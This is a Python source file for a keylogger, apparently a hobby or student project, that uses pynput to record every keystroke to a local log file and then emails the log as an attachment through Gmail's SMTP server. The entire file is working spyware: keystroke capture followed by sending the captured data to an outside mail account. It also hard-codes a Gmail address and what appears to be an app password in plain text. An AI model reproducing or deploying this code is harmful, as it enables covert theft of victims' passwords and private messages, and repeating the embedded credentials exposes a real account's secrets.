from pynput.keyboard import Key , Listener
from pynput import keyboard
#	MIME Multi Internet Mail Extension
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

emailid = 'keyloggerprojectmail@gmail.com'
password = 'mmmfshksklisgxbj'
toaddr = 'keyloggerprojectmail@gmail.com'
fileName = 'log.txt'
filePath = '/home/kali/Desktop/KeyLogger/'

def sendEmail(filename, attachment, toaddr):
	fromAddr = emailid
	msg = MIMEMultipart()
	msg['From'] = fromAddr
	msg['To'] = toaddr
	msg['Subject'] = 'Subject of mail'
	
	body = "body of the mail"
	msg.attach(MIMEText(body,'plain'))
	
	filename = filename
	attachment = open(attachment,'rb')
	
	p = MIMEBase('application','octet-stream')
	p.set_payload((attachment).read())
	
	encoders.encode_base64(p)
	
	p.add_header('Content-Disposition',"attachment; filename = %s" %filename)
	msg.attach(p)
	try:
		s = smtplib.SMTP('smtp.gmail.com',587)
		s.starttls()
		s.login(fromAddr,password)
		text = msg.as_string()
		s.sendmail(fromAddr,toaddr,text)
		print("\nEmail sent successfully\n")
	except smtplib.SMTPException as e:
		print("\nError in sending email :",str(e))
		print()
	finally:
		s.quit()

keys = []
count = 0

def onPress(key):
	global keys,count
	keys.append(key)
	count += 1
	if count >= 10:
		count = 0
		writeFile(keys)
		keys = []

def writeFile(keys):
	print(keys)
	with open("/home/kali/Desktop/KeyLogger/log.txt", 'a') as f:
		for key in keys:
			k = str(key).replace("'", "")
			print(key)
			if k.find("space") >= 0:
				f.write('\n')
			elif k == keyboard.Key.delete:
				f.write(' delete ')
			elif k == keyboard.Key.backspace:
				f.write('<-')
			else:
				f.write(k)
		f.close()
	
def onRelease(key):
	if key == Key.esc:
		return False

try:
	with Listener(on_press=onPress , on_release= onRelease) as listener:
		listener.join()
except:
	print("Program interrupted by user\n")
	
sendEmail(fileName,filePath + fileName ,toaddr)

